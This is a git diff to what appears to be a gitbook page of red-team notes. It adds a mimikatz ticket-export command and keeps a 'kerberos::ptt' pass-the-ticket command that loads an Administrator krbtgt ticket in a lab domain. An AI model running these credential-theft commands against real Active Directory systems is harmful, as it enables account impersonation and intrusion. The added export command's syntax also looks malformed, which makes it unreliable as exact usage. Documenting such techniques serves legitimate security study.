@@ -38,8 +38,15 @@ mimikatz # sekurlsa::tickets
 
 ![](../.gitbook/assets/screenshot-from-2018-10-29-23-40-27.png)
 
-```text
 
+
+```text
+mimikatz::tickets /export
+```
+
+![](../.gitbook/assets/screenshot-from-2018-10-29-23-56-20.png)
+
+```text
 mimikatz # kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi
 ```
 
@@ -47,7 +54,7 @@ mimikatz # kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-4
 
 ![](../.gitbook/assets/screenshot-from-2018-10-29-23-50-40.png)
 
-![](../.gitbook/assets/screenshot-from-2018-10-29-23-51-46.png)
+![](../.gitbook/assets/screenshot-from-2018-10-29-23-59-12.png)
 
 {% embed url="https://adsecurity.org/?p=1667" %}
 
